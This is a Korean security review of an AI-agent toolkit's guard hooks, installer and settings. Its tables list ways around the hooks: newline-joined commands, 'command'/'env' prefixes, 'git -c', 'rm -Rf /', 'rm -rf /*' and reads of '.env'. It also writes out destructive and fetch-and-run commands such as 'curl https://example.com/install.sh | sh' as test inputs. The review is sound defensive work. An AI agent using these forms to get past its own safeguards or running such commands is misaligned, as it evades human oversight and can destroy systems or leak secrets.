# 리뷰 검증 정리

검증일: 2026-07-02

대상: `bunjang-ai-toolkit` 저장소의 훅, 설치 스크립트, Codex/Claude 설정, CLI 래퍼, 테스트.

## 결론

초안 리뷰의 방향은 대체로 적절하다. 특히 `bypassPermissions` 또는 full-access 계열 사용을 전제로 하는 프로젝트에서 `.hooks/`가 방어선 역할을 하는데, Bash command boundary 처리와 위험 `rm` 패턴에서 실제 우회가 재현됐다. 이 2건은 Critical로 유지하는 것이 맞다.

다만 몇 항목은 표현을 조정해야 한다.

- `npm test -- -glogin`은 현재 정규식에서 차단되지 않는다. 오탐 재현 예시는 `npm test -- -g login`처럼 `-g`가 별도 토큰인 경우가 맞다.
- `.codex/config.toml`의 훅 미설정 문제는 파일 내용상 사실이지만, 이 파일이 실제 로드되는 사용자 설정인지 템플릿인지에 따라 영향도가 달라진다. 조건부 Major로 적는 편이 정확하다.
- `chat.start`의 `--message` required 여부는 `bunjang-cli@0.2.1` 패키지 tarball 기준으로 확인됐다. 래퍼는 메시지 없이 `chat start <listingId>`를 만들 수 있으므로 계약 drift로 추가하는 것이 맞다.

검증 중 `npm test`는 통과했다: 26 pass, 1 skip. 이는 아래 이슈들이 기존 테스트로 잡히지 않는다는 뜻에 가깝다.

## 우선순위

1. 훅 우회 2건 수정: 개행 command boundary, 위험 `rm` 패턴.
2. 훅 정규식의 prefix 우회 보강: `command`, `env`, `git -c`, multiline second command.
3. `bunjang-assistant`에서 `bunjang-ai-toolkit`로 rename된 저장소 URL과 installer allow-list 정리.
4. Claude/Codex 보안 설정 drift와 Codex hook activation 상태 정리.
5. 설치 스크립트의 preflight, rollback, diagnostics 개선.

## Critical

### C1. 개행 정규화로 명령 경계 기반 Bash 훅이 우회됨

상태: CONFIRMED

위치:

- `.hooks/pre_tool_use_common.sh:3`
- `.hooks/pre_tool_use_common.sh:10`
- 영향 훅: `block_git_origin_push.sh`, `block_global_system_commands.sh`, `block_global_package_install.sh`, `block_pipe_to_shell.sh`

근거:

`hook_normalized_command`가 newline과 tab을 모두 공백으로 바꾼다.

```sh
hook_command_text | tr '\n\t' '  ' | sed -E 's/[[:space:]]+/ /g'
```

Bash에서 newline은 명령 구분자인데, 훅 정규식의 `HOOK_COMMAND_BOUNDARY='(^|[;&|][[:space:]]*)'`에는 newline이 남아 있지 않는다. 그 결과 두 번째 줄의 위험 명령이 앞 명령의 인자처럼 붙어서 command boundary에 걸리지 않는다.

재현 결과:

| 입력 command | 결과 |
| --- | --- |
| `git push origin main` | BLOCKED |
| `echo hi\ngit push origin main` | ALLOWED |
| `sudo rm -rf /etc` | BLOCKED |
| `echo hi\nsudo rm -rf /etc` | ALLOWED |
| `curl https://example.com/install.sh \| sh` | BLOCKED |
| `echo ok\ncurl https://example.com/install.sh \| sh` | ALLOWED |

영향:

방어 훅이 "명령 시작"을 기준으로 검사하는 모든 Bash 정책에서 같은 우회가 가능하다. bypass/full-access 계열 실행에서는 실질 방어선이 사라진다.

권장 수정:

- newline을 공백이 아니라 `;` 같은 명령 경계로 보존한다.
- 가능하면 shell 문자열을 정규식으로만 판정하지 말고 shell parser 기반 또는 최소한 command separator 보존 기반으로 검사한다.
- 각 Bash 훅에 multiline 회귀 테스트를 추가한다.

### C2. 가장 위험한 `rm` 변형이 통과함

상태: CONFIRMED

위치:

- `.hooks/block_global_system_commands.sh:9`
- `.hooks/block_global_system_commands.sh:14`

근거:

현재 `rm` 패턴은 `-(r|f|rf|fr)`만 허용한다. 대문자 `R` 계열이 빠져 있고, 루트 경로 대안은 `/($|[[:space:]])` 형태라 `/*`를 루트 타깃으로 보지 못한다.

재현 결과:

| 입력 command | 결과 |
| --- | --- |
| `rm -rf /` | BLOCKED |
| `rm -rf /*` | ALLOWED |
| `rm -R /` | ALLOWED |
| `rm -Rf /` | ALLOWED |

영향:

`rm -rf /*`, `rm -R /`, `rm -Rf /`는 훅이 막으려는 대표적인 파괴적 명령인데 통과한다.

권장 수정:

- 플래그 판정에 `R`, `Rf`, `fR` 등을 포함한다.
- 루트 타깃에 `/`, `/*`, `/.`, `/..`류를 별도로 검사한다.
- `rm` 옵션은 결합 순서가 자유롭기 때문에 단일 alternation보다 option token을 분해해 판정하는 편이 안전하다.

## Major

### M1. Claude Read deny 정책이 Codex 정책보다 좁음

상태: CONFIRMED, 단 `.ssh/*`의 정확한 glob 의미는 Claude host 해석에 따름.

위치:

- `.claude/settings.json:10`
- `.claude/settings.json:23`
- `.claude/settings.json:34`
- `.claude/settings.json:138`
- `.codex/config.toml:280`
- `.codex/config.toml:295`

근거:

Codex 설정은 `.env`, `.env.prod*`, `**/.env`, `**/.env.prod*`, `**/.ssh/**`를 deny한다. Claude 설정은 `Read(.env)`, `Read(.env.prod*)`, `Read(**/.ssh/*)`로 더 좁다.

영향:

일반 glob 의미라면 `install/.env`, 하위 디렉터리의 `.env`, `.ssh/subdir/key`는 Claude Read deny에서 빠질 수 있다. Read는 현재 PreToolUse Bash 훅 대상도 아니므로 훅으로 보완되지 않는다.

권장 수정:

- Claude deny 목록을 Codex deny 목록과 같은 범위로 맞춘다.
- `Read(**/.env)`, `Read(**/.env.prod*)`, `Read(**/.ssh/**)`, `Read(**/.aws/**)`처럼 recursive 패턴을 명시한다.
- 정책 drift를 잡는 메타데이터 테스트를 추가한다.

### M2. 저장소 rename이 설치 경로와 allow-list에 반영되지 않음

상태: CONFIRMED

위치:

- `README.md:8`
- `README.md:21`
- `README.md:28`
- `install/bunjang-assistant-install.mjs:10`
- `install/bunjang-assistant-install.mjs:12`
- `install/bunjang-assistant-install.mjs:204`
- `install/bunjang-assistant-install.mjs:221`
- `plugin.json:9`
- `plugin.json:10`
- `.agents/plugins/marketplace.json:11`
- `.codex-plugin/plugin.json:9`
- `.codex-plugin/plugin.json:10`

근거:

README 제목은 `bunjang-ai-toolkit`인데, installer 기본 source와 allowed remote source는 `kimchanhyung98/bunjang-assistant`만 허용한다.

재현:

```sh
node install/bunjang-assistant-install.mjs \
  --tool codex \
  --source https://github.com/kimchanhyung98/bunjang-ai-toolkit.git \
  --dry-run \
  --no-skill \
  --no-install-cli
```

결과:

```text
error: --source https://github.com/kimchanhyung98/bunjang-ai-toolkit.git is not in the allowed list. Only the official bunjang-assistant repo or a local path is accepted.
```

영향:

현재 정식 저장소명을 사용하는 설치가 즉시 실패한다. 구 이름 URL은 GitHub redirect가 유지되는 동안만 동작한다.

권장 수정:

- 정식 repository URL, homepage, marketplace URL, installer allow-list를 `bunjang-ai-toolkit` 기준으로 통일한다.
- 플러그인 ID와 npm package/bin 이름은 호환성 때문에 유지할지 별도 결정한다.
- 테스트가 구 URL 문자열을 고정 검증하므로 함께 갱신한다.

### M3. Codex hook 기능은 켜져 있지만 PreToolUse 정의가 없음

상태: PARTIAL / CONDITIONAL

위치:

- `.codex/config.toml:79`
- `.codex/config.toml:91`
- `.codex/config.toml:382`
- `.codex/config.toml:406`
- `.codex/config.toml:414`

근거:

파일에는 `approval_policy = "never"`, `sandbox_mode = "danger-full-access"`, `[features] hooks = true`가 있다. 그러나 `[hooks]`와 `[[hooks.PreToolUse]]` 예시는 전부 주석이고, `.codex/hooks.json`도 없다.

영향:

이 파일이 실제 Codex 설정으로 로드되는 환경이라면 Bash PreToolUse 훅이 연결되지 않는다. 그러면 `git push`, `curl | sh`, 전역 설치 등은 이 저장소 훅을 거치지 않는다.

주의:

저장소만 보고는 이 파일이 실제 사용자 `CODEX_HOME` 설정인지, 문서용 템플릿인지 확정할 수 없다. 따라서 초안처럼 PLAUSIBLE 또는 조건부 Major로 쓰는 것이 정확하다.

권장 수정:

- 실제 배포되는 Codex 설정이라면 `.hooks/*.sh`를 PreToolUse에 연결한다.
- 템플릿이라면 위험한 `danger-full-access` 예시와 hook 미연결 상태를 분리한다.
- CI에서 `.codex/config.toml`과 hook 파일 연결 여부를 검사한다.

### M4. installer가 CLI 존재 검증 전에 skill을 복사해 부분 설치를 남김

상태: CONFIRMED

위치:

- `install/bunjang-assistant-install.mjs:318`
- `install/bunjang-assistant-install.mjs:344`
- `install/bunjang-assistant-install.mjs:385`
- `install/bunjang-assistant-install.mjs:388`

근거:

main loop가 `installSkill(tool, opts)`를 먼저 호출하고, 그 뒤 `installCodex()` 또는 `installClaude()` 안에서 `requireCommand()`를 수행한다.

임시 `CODEX_HOME`에서 `codex`가 없는 PATH로 `--tool both`를 실행하면 Codex skill이 먼저 복사된 뒤 `required command not found: codex`로 실패했다. Claude 단계는 실행되지 않았다.

영향:

일부 파일만 설치된 오염 상태가 남고, 동시에 정상 설치 가능한 다른 surface까지 진행하지 못한다.

권장 수정:

- loop 진입 전에 대상 surface의 필수 CLI를 모두 preflight한다.
- `--tool both`에서는 한 surface 실패가 다른 surface 설치를 막을지 정책을 명확히 한다.
- 실패 시 이미 복사한 skill을 rollback하거나, summary에 남긴다.

### M5. dangling symlink가 `--replace`로 제거되지 않아 설치가 실패함

상태: CONFIRMED

위치:

- `install/bunjang-assistant-install.mjs:236`
- `install/bunjang-assistant-install.mjs:239`
- `install/install-skills.sh:122`

근거:

`removeSkillIfReplacing()`는 `existsSync(target)`로 존재 여부를 본다. dangling symlink에서는 `existsSync`가 false를 반환하므로 링크 자체를 제거하지 않는다. 이후 `install-skills.sh`는 `[ -e "$TARGET_SKILL" ] || [ -L "$TARGET_SKILL" ]`로 symlink를 감지하고 충돌로 실패한다.

임시 `CODEX_HOME/skills/bunjang -> missing-source` symlink에서 재현됨:

```text
오류: 기존 skill 경로와 충돌합니다: .../codex/skills/bunjang
```

권장 수정:

- 존재 확인도 `lstatSync` 또는 `fs.existsSync` + `lstat` 실패 처리로 링크 자체를 기준으로 한다.
- shell helper와 Node installer가 같은 symlink 정책을 공유하도록 테스트를 추가한다.

### M6. SIGTERM 무시 프로세스 force-kill 테스트가 실제 경로를 보장하지 못함

상태: CONFIRMED

위치:

- `src/cli.js:172`
- `src/cli.js:176`
- `src/cli.js:190`
- `test/bunjang-cli.test.js:154`

근거:

테스트는 최종 오류 메시지가 timeout인지 확인할 뿐, `SIGKILL`이 실제로 호출됐는지 또는 자식 프로세스가 종료됐는지 확인하지 않는다. `timeoutMs: 20`은 fake Node script가 SIGTERM handler를 등록하기 전에 종료될 가능성도 크다.

추가 문제:

`killGraceMs` 이후 `child.kill("SIGKILL")`을 호출하자마자 `finish(timeoutResult(...))`를 호출하고 `close`를 기다리지 않는다. 실제 SIGTERM 무시 프로세스에서는 자식 종료 확인 없이 wrapper promise가 끝날 수 있다.

권장 수정:

- fake bin이 준비 완료 신호를 낸 뒤 timeout을 시작하거나, SIGTERM을 확실히 무시하는 shell/perl/node fixture를 사용한다.
- `SIGKILL` 이후에도 `close` 또는 bounded wait로 프로세스 종료를 확인한다.
- 테스트에서 child pid 생존 여부 또는 signal 경로를 검증한다.

### M7. 전역 패키지 설치 훅이 오탐과 우회를 모두 가짐

상태: CONFIRMED, 초안 재현 예시는 일부 수정 필요.

위치:

- `.hooks/block_global_package_install.sh:10`

근거:

정규식이 `install`, `add`, `global` 같은 서브커맨드 문맥을 요구하지 않고, command boundary 이후 `npm|pnpm|yarn`과 `-g|--global|global` 토큰만 찾는다.

재현 결과:

| 입력 command | 결과 |
| --- | --- |
| `npm install -g foo` | BLOCKED |
| `npm i -g foo` | BLOCKED |
| `pnpm add --global foo` | BLOCKED |
| `npm test -- -g login` | BLOCKED, 오탐 |
| `npm test -- -glogin` | ALLOWED, 초안 예시는 부정확 |
| `command npm install -g foo` | ALLOWED, 우회 |
| `env FOO=1 npm install -g foo` | ALLOWED, 우회 |

권장 수정:

- package manager별 설치 서브커맨드 문맥을 명시한다.
- test runner로 전달되는 `-- -g pattern`을 구분한다.
- `command`, `env`, `xargs`, shell function 등 prefix 처리 정책을 정한다.

### M8. `git push` 훅이 common prefix와 git global option을 놓침

상태: CONFIRMED

위치:

- `.hooks/block_git_origin_push.sh:8`

근거:

정규식은 command boundary 직후 `git` 또는 `/.../git`만 허용하고, 그 뒤에는 선택적 `-C` 하나만 처리한다.

재현 결과:

| 입력 command | 결과 |
| --- | --- |
| `git push origin main` | BLOCKED |
| `command git push origin main` | ALLOWED |
| `env FOO=1 git push origin main` | ALLOWED |
| `git -c user.name=x push origin main` | ALLOWED |

권장 수정:

- `command`, `env KEY=VALUE`, `git -c ...`, `git --config-env ...` 등 일반 prefix/global option을 처리한다.
- 이름이 `block_git_origin_push.sh`인데 실제 메시지는 모든 `git push` 차단이다. origin만 막을지 모든 push를 막을지 정책명을 맞춘다.

### M9. `chat.start` 래퍼 계약이 `bunjang-cli@0.2.1`과 맞지 않음

상태: CONFIRMED

위치:

- `src/cli.js:239`
- `src/cli.js:246`
- `src/config.js:71`
- `package.json:18`

근거:

래퍼는 `params.message`가 있을 때만 `--message`를 붙인다. 그러나 `bunjang-cli@0.2.1`의 `dist/src/commands/chat.js`는 `chat start <listingId>`에 `.requiredOption('--message <text>')`를 선언한다.

임시 설치한 `bunjang-cli@0.2.1` 실행 결과:

```text
bunjang-cli --json chat start 123
error: required option '--message <text>' not specified
```

영향:

AI가 `chat.start`를 메시지 없이 호출하면 wrapper 레벨에서는 통과하지만 실제 CLI에서 실패한다.

권장 수정:

- wrapper에서 `chat.start`의 `message`를 required로 바꾼다.
- 아니면 dependency CLI를 optional message 계약으로 바꾸고 package version을 갱신한다.
- capability docs에 first message 필요 여부를 명시한다.

## Minor / 정확성 및 진단성

### m1. timeout이 기존 stderr를 버림

상태: CONFIRMED

위치:

- `src/cli.js:196`

타임아웃 전에 자식이 stderr에 원인을 썼더라도 최종 오류는 `bunjang-cli timed out after ...ms`로 대체된다. 임시 fake CLI가 `network stack stuck before timeout`을 stderr에 쓴 뒤 멈추는 경우에도 최종 오류에는 timeout 문구만 남았다.

권장: timeoutResult에 수집한 stderr tail을 포함한다.

### m2. signal 종료가 spawn 실패로 오진단됨

상태: CONFIRMED

위치:

- `src/cli.js:28`
- `src/cli.js:190`

`close` 콜백의 `signal` 인자를 버리기 때문에 자식이 `SIGTERM`으로 종료되면 `exitCode === null`만 남고, wrapper는 `Failed to spawn bunjang-cli at ...`로 보고한다.

권장: `close`의 `(exitCode, signal)`을 모두 보존하고 signal 종료 메시지를 따로 낸다.

### m3. 문자열 `"false"`가 boolean 옵션을 켬

상태: CONFIRMED

위치:

- `src/cli.js:213`
- `src/cli.js:214`
- `src/cli.js:221`

`search.listings`는 `params.withDetail`과 `params.ai`를 truthy 검사만 해서 `"false"` 문자열도 `--with-detail`, `--ai`가 된다. 반대로 `agent-search-rank`는 `withDetail: false`처럼 false 값도 "unsupported option present"로 거부한다.

권장: boolean 옵션은 `true`만 활성화하고, false는 비활성 값으로 허용할지 명확히 한다.

### m4. `-`로 시작하는 search query가 CLI option으로 해석됨

상태: CONFIRMED

위치:

- `src/cli.js:205`
- `bunjang-cli@0.2.1`의 `search <query>` commander 정의

래퍼는 query를 그대로 위치 인자로 전달한다. 실제 `bunjang-cli --json search -아이폰`은 `error: unknown option '-아이폰'`으로 실패했다.

권장: query 앞에 `--` 구분자를 넣을 수 있는지 확인하거나, CLI 쪽에서 positional option parsing을 조정한다.

### m5. 기존 skill 삭제 후 실패 시 rollback이 없음

상태: CONFIRMED

위치:

- `install/bunjang-assistant-install.mjs:236`
- `install/bunjang-assistant-install.mjs:253`

`replace=true`일 때 기존 skill을 먼저 삭제하고 `install-skills.sh`를 실행한다. 이후 `bash` 실행 실패 등으로 설치가 중단되면 기존 skill이 사라진다. 임시 `CODEX_HOME`과 PATH에서 재현됨.

권장: 새 경로에 먼저 설치한 뒤 atomic rename하거나, 실패 시 기존 skill을 복구한다.

### m6. `--json` 실패 경로가 stderr와 summary를 잃음

상태: CONFIRMED

위치:

- `install/bunjang-assistant-install.mjs:154`
- `install/bunjang-assistant-install.mjs:170`
- `install/bunjang-assistant-install.mjs:402`

`--json` 모드에서 하위 명령이 실패하면 stdout/stderr를 pipe로 캡처하지만 최종 오류는 `command failed: ...`뿐이고 JSON summary도 출력되지 않는다. fake `codex`가 stderr를 썼지만 installer stderr에는 하위 stderr가 포함되지 않았다.

권장: 실패 summary JSON을 출력하거나, 최소한 하위 stderr tail을 오류에 포함한다.

### m7. `--tool cli --with-skill`이 조용히 무시됨

상태: CONFIRMED

위치:

- `install/bunjang-assistant-install.mjs:87`
- `install/bunjang-assistant-install.mjs:385`
- `install/bunjang-assistant-install.mjs:387`

`--with-skill`은 public skill discovery bundle도 설치한다고 설명하지만, `--tool cli`는 loop에서 `continue`되어 skill 설치가 전혀 계획되지 않는다. `--tool cli --with-skill --no-install-cli --dry-run --json`은 steps가 빈 배열이다.

권장: `cli` tool에서는 `--with-skill`을 오류로 거부하거나, target surface를 요구한다.

### m8. `src/index.js` import가 `process.argv[1]` realpath에 의존함

상태: CONFIRMED

위치:

- `src/index.js:62`
- `src/index.js:65`

`process.argv[1]`가 존재하지 않는 경로이면 import만 해도 `realpathSync(process.argv[1])`에서 `ENOENT`가 난다.

권장: `process.argv[1]` realpath 실패는 direct-run false로 처리한다.

### m9. skill copy 설치물의 문서가 repo `src/`를 가리킴

상태: CONFIRMED

위치:

- `install/install-skills.sh:6`
- `install/install-skills.sh:136`
- `skills/bunjang/docs/capability-registry.md:7`
- `skills/bunjang/docs/capability-registry.md:8`

`install-skills.sh`는 `skills/bunjang`만 설치한다. 그런데 설치된 skill 문서 안의 `capability-registry.md`는 `src/config.js`, `src/cli.js`를 먼저 확인하라고 안내한다. standalone skill copy만 있는 환경에서는 해당 파일이 없다.

권장: 설치된 skill 문서에서는 package runner 또는 bundled docs를 기준으로 안내하고, repo source 파일 참조는 개발자용 문서로 분리한다.

### m10. metadata 테스트가 릴리스 문자열을 강하게 고정함

상태: PARTIAL

위치:

- `test/toolkit-metadata.test.js:9`
- `test/toolkit-metadata.test.js:10`
- `test/toolkit-metadata.test.js:17`
- `test/toolkit-metadata.test.js:96`
- `test/toolkit-metadata.test.js:101`

버전과 dependency 버전을 여러 위치에서 직접 assert한다. 릴리스 범프 때 테스트 수정이 필요한 것은 사실이다. 다만 metadata drift를 의도적으로 잡는 테스트라면 그 자체가 버그는 아니다.

권장: release bump 비용이 문제라면 package metadata를 single source로 읽어 다른 manifest와 비교한다.

### m11. 일부 실패 계약의 테스트 공백

상태: CONFIRMED

위치:

- `src/index.js:44`
- `test/bunjang-cli.test.js:304`
- `install/install-skills.sh:122`
- `test/installer.test.js:86`

현재 테스트는 invalid JSON은 확인하지만 `paramsJson`이 배열/null/string인 경우의 비객체 거부는 직접 확인하지 않는다. `install-skills.sh`도 symlink idempotency는 확인하지만 copy mode 충돌 실패 계약은 별도 테스트가 없다.

권장: 작은 회귀 테스트를 추가한다.

### m12. jq 실패 시 deny 출력이 없음

상태: CONFIRMED for script behavior, host impact CONDITIONAL

위치:

- `.hooks/pre_tool_use_common.sh:5`
- `.hooks/pre_tool_use_common.sh:6`
- `.hooks/pre_tool_use_common.sh:13`

invalid JSON을 훅에 넣으면 `jq` parse error와 exit code만 나오고 deny JSON은 출력되지 않는다. `jq` 미설치도 같은 계열의 실패가 된다.

영향은 hook host가 non-zero hook exit을 어떻게 처리하는지에 따라 달라진다. host가 실패를 deny로 취급하지 않으면 fail-open이다.

권장: jq 존재/parse 실패를 명시적으로 fail-closed deny로 바꾸거나, installer/preflight에서 jq를 필수 dependency로 검증한다.

### m13. 옵션 빌더와 설치 경로 로직 중복

상태: CONFIRMED, 낮은 우선순위

위치:

- `src/cli.js:204`
- `src/cli.js:221`
- `install/bunjang-assistant-install.mjs:226`
- `install/install-skills.sh:62`

`search.listings`와 `agent-search-rank`의 공통 옵션 빌더가 중복되고, installer와 shell helper의 기본 target 계산도 중복된다. 이미 `project` scope에서 installer는 `process.cwd()` 기준 target을 넘기고, shell helper 기본값은 `REPO_ROOT` 기준이라는 차이가 있다.

권장: behavior 변경 없이 작은 helper로만 묶거나, 중복을 유지하되 테스트로 drift를 잡는다.

## 초안에서 조정할 문장

- "npm test -- -glogin이 차단됨"은 부정확하다. 현재 패턴은 `-glogin`을 차단하지 않고, `npm test -- -g login`을 차단한다.
- ".codex/config.toml 때문에 Codex에서 무검사 실행됨"은 조건부로 써야 한다. 파일상 hook definition 부재는 확인됐지만, 실제 로드 여부는 별도 확인이 필요하다.
- "chat.start의 --message required 여부 미검증"은 더 이상 미검증이 아니다. `bunjang-cli@0.2.1` tarball 기준 required가 확인됐다.
- "GitHub 301 redirect가 끊기면 404"는 타당한 리스크지만 현재 시점의 직접 실패는 `bunjang-ai-toolkit.git`이 installer allow-list에서 거부되는 문제다.

## 검증 메모

사용한 검증:

- `.hooks/*.sh`에 JSON payload를 직접 넣어 BLOCKED/ALLOWED 확인.
- installer를 임시 `HOME`/`CODEX_HOME`/`PATH`로 실행해 부분 설치, dangling symlink, rollback 부재, JSON diagnostics를 확인.
- `npm test` 실행: pass 26, skip 1.
- `npm pack bunjang-cli@0.2.1`을 `/tmp` cache로 받아 `chat.start`와 `search` commander 계약 확인.

저장소 수정은 이 문서 추가만 수행했다.

---

## 추가 검증: 웹/공식 문서 대조

추가 검증일: 2026-07-02

이 섹션은 위 본문을 삭제/대체하지 않고, 공식 문서와 추가 로컬 재현으로 확인한 보강 의견만 덧붙인다.

### 공식 문서로 보강된 판단

- Claude Code 공식 hook guide는 command hook이 `exit 2`로 차단할 수 있고, `exit 0`에서 stdout JSON의 `hookSpecificOutput.permissionDecision: "deny"`로도 PreToolUse 도구 호출을 취소할 수 있다고 설명한다. 따라서 이 저장소 훅들이 deny JSON을 출력하고 `exit 0`으로 끝나는 방식 자체는 공식 동작과 맞다. 다만 `jq` 파싱 실패나 `jq` 미설치처럼 `exit 5/127` 등 다른 non-zero로 끝나는 경우는 작업이 계속된다고 문서화되어 있으므로, m12의 fail-open 우려는 유지된다.
- Claude Code hook reference는 PreToolUse가 `Bash`, `Edit`, `Write`, `Read` 같은 도구 이름별로 매칭되고, Bash 입력에는 `tool_input.command`, Read 입력에는 `tool_input.file_path`가 들어간다고 설명한다. 이 구조상 `Read(.env)` deny와 Bash command 훅은 별개 경로다. 현재 Bash 훅들이 `cat .env`류를 검사하지 않는다는 점은 `_security.md` V3의 핵심 근거와 일치한다.
- Claude Code settings 문서는 `.claude/settings.json`이 프로젝트 설정으로 공유된다고 설명하지만, `skipDangerousModePermissionPrompt`는 프로젝트 설정에서 무시된다고도 명시한다. 따라서 위협 모델은 "`skipDangerousModePermissionPrompt: true`가 저장소만으로 prompt를 생략한다"가 아니라, "세션이 실제로 `bypassPermissions`로 실행되는 경우"로 표현하는 것이 더 정확하다.
- Codex 공식 config basics는 trusted project에서 `.codex/config.toml` 프로젝트 override를 로드한다고 설명한다. Codex hooks 문서는 hook source가 `hooks.json` 또는 inline `[hooks]`이며, repo-local hook은 trusted project에서만 로드된다고 설명한다. 따라서 M3은 조건부가 맞다. 이 프로젝트가 trusted 상태로 로드되면 `.codex/config.toml`에 `[features].hooks = true`만 있고 실제 hook source가 없다는 지적은 유효하지만, 사용자/system/plugin hook이 별도로 있을 가능성까지 배제하지는 못한다.
- Codex sandbox/permissions 문서는 `danger-full-access`가 filesystem/network boundary를 제거하며 의도적 full access일 때만 쓰라고 설명한다. 따라서 `.codex/config.toml`의 위험도 평가는 유지하되, 실제 적용 여부는 현재 Codex session의 trust/config layering으로 확인해야 한다.
- Bash manual은 newline이 command list에서 semicolon 대신 command delimiter로 쓰일 수 있다고 설명한다. C1의 "개행을 공백으로 바꾸면 shell command boundary가 사라진다"는 판단을 공식 shell semantics로도 뒷받침한다.
- Git 공식 문서는 `git [-C <path>] [-c <name>=<value>] ... [--config-env=...] <command>` 형태를 전역 option으로 인정한다. M8의 `git -c ... push`, `git --no-pager push` 우회는 Git CLI 문법상 자연스러운 변형이다.
- Node.js fs 문서는 `fs.exists()`/exists 계열이 symbolic link를 따라가며 dangling symlink에 false가 될 수 있고, `lstat()`은 symlink 자체를 stat한다고 설명한다. M5의 `existsSync` 대신 `lstatSync` 기반 처리가 필요하다는 결론과 맞다.

참고한 웹/공식 문서:

- Claude Code hooks guide: https://code.claude.com/docs/ko/hooks-guide
- Claude Code hooks reference: https://code.claude.com/docs/en/hooks
- Claude Code settings: https://code.claude.com/docs/en/settings
- Codex config basics: https://developers.openai.com/codex/config-basic
- Codex hooks: https://developers.openai.com/codex/hooks
- Codex sandboxing: https://developers.openai.com/codex/concepts/sandboxing
- Codex permissions: https://developers.openai.com/codex/permissions
- Bash manual: https://man7.org/linux/man-pages/man1/bash.1.html
- Git command documentation: https://git-scm.com/docs/git
- Node.js fs documentation: https://nodejs.org/api/fs.html

### 추가 로컬 재현으로 보강된 항목

`docs/_security.md`까지 함께 보며 추가로 훅 입력만 시뮬레이션했다. 실제 위험 명령은 실행하지 않고, 훅 스크립트에 JSON payload만 넣었다.

| 항목 | 추가 입력 | 결과 | 의견 |
| --- | --- | --- | --- |
| C1/V1 | ` git push origin main` | ALLOWED | 선행 공백도 command boundary 우회가 맞다. |
| C1/V1 | `(curl https://example.com/i.sh \| sh)` | ALLOWED | subshell 괄호 앞 경계가 없어 pipe-to-shell 가드가 우회된다. |
| M8/V4 | `FOO=1 git push origin main` | ALLOWED | env assignment prefix도 우회된다. |
| M8/V4 | `git --no-pager push origin main` | ALLOWED | `-C` 외 git global option 우회가 재현된다. |
| C2/V5 | `rm -rf "/"` | ALLOWED | quoted root 변형 누락이 재현된다. |
| C2/V5 | `rm -rf /Users/example`, `rm -rf /tmp`, `rm -rf /private` | ALLOWED | system path 목록 밖 주요 경로 삭제는 현재 훅이 막지 않는다. |
| C2/V5 | `rm -rf "$HOME"` | BLOCKED | `$HOME` 자체는 현재 정규식에 잡힌다. 홈 경로 항목은 `/Users/...` 등 구체 경로 우회로 좁혀 쓰는 것이 정확하다. |
| V2 | Write payload `file_path=.hooks/block_pipe_to_shell.sh` | ALLOWED | hook 자기보호 부재가 재현된다. |
| V2 | Write payload `file_path=.claude/settings.json` | ALLOWED | 프로젝트 보안 설정 파일도 현재 edit hook으로 보호되지 않는다. |
| V2 | Write payload `file_path=node_modules/foo.js` | BLOCKED | dependency folder 차단 자체는 동작한다. |
| V3 | `cat .env`를 Bash 훅들에 입력 | ALLOWED | Bash 경로에서 secret read를 검사하지 않는다는 지적이 재현된다. 실제 파일 read 여부는 Claude permission/sandbox 적용 상태에 따르지만, 현 Bash 훅에는 해당 방어가 없다. |

### 보정 의견

- `_security.md` V6의 취지는 타당하지만, "exit 2만 차단"이라고만 쓰면 부정확하다. 공식 문서상 `exit 0 + JSON deny`도 차단이다. 정확한 문제는 `jq` 실패가 deny JSON을 만들지 못하고 `exit 2`도 내지 않아 "기타 non-zero는 진행" 경로로 떨어질 수 있다는 점이다.
- `_security.md` 위협 모델은 `skipDangerousModePermissionPrompt`가 프로젝트 설정에서 무시된다는 공식 문서 내용을 반영해 다듬어야 한다. `bypassPermissions` 상태 자체를 전제로 한 분석은 여전히 유효하다.
- 저장소 rename 문제는 웹 검색보다 현재 git remote가 더 강한 근거다. 현재 `origin`은 `https://github.com/kimchanhyung98/bunjang-ai-toolkit.git`인데, 설치 스크립트와 문서 다수는 `bunjang-assistant` URL을 유지한다. M2는 유지한다.
